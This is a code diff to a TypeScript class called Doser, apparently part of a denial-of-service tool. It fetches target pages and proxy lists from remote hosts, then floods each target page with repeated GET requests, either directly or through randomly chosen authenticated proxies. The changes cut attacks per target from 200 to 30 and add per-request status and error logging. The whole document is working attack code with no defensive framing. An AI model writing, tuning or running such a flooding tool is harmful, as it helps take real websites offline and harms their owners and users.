@@ -1,4 +1,4 @@
-import axios from 'axios'
+import axios, { AxiosError } from 'axios'
 import { EventEmitter } from 'events'
 
 interface ProxyData {
@@ -47,7 +47,9 @@ export class Doser {
   async getRandomTarget () {
     while (this.working) { // escaping unavailable hosts
       try {
-        const host = this.hosts[Math.floor(Math.random() * this.hosts.length)]
+        const hostID = Math.floor(Math.random() * this.hosts.length)
+        console.log(`Selected host id: ${hostID}`)
+        const host = this.hosts[hostID]
         const response = await axios.get(host, { timeout: 10000 })
         if (response.status !== 200) continue
         return response.data as TargetData
@@ -91,13 +93,13 @@ export class Doser {
         }
       }
 
-      const ATACKS_PER_TARGET = 200
+      const ATACKS_PER_TARGET = 30
 
       for (let atackIndex = 0; (atackIndex < ATACKS_PER_TARGET) && this.working; atackIndex++) {
-        this.eventSource.emit('atack', { type: 'atack', url: target.site.page })
         try {
           if (directRequest) {
-            await axios.get(target.site.page, { timeout: 5000 })
+            const r = await axios.get(target.site.page, { timeout: 5000 })
+            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
           } else {
             const proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
             const proxyAddressSplit = proxy.ip.split(':')
@@ -107,7 +109,7 @@ export class Doser {
             const proxyUsername = proxyAuthSplit[0]
             const proxyPassword = proxyAuthSplit[1]
 
-            await axios.get(target.site.page, {
+            const r = await axios.get(target.site.page, {
               timeout: 5000,
               proxy: {
                 host: proxyIP,
@@ -118,8 +120,13 @@ export class Doser {
                 }
               }
             })
+
+            this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })
           }
         } catch (e) {
+          let code = (e as AxiosError).code
+          if (code === undefined) code = 'UNKNOWN'
+          this.eventSource.emit('atack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
         }
       }
     }
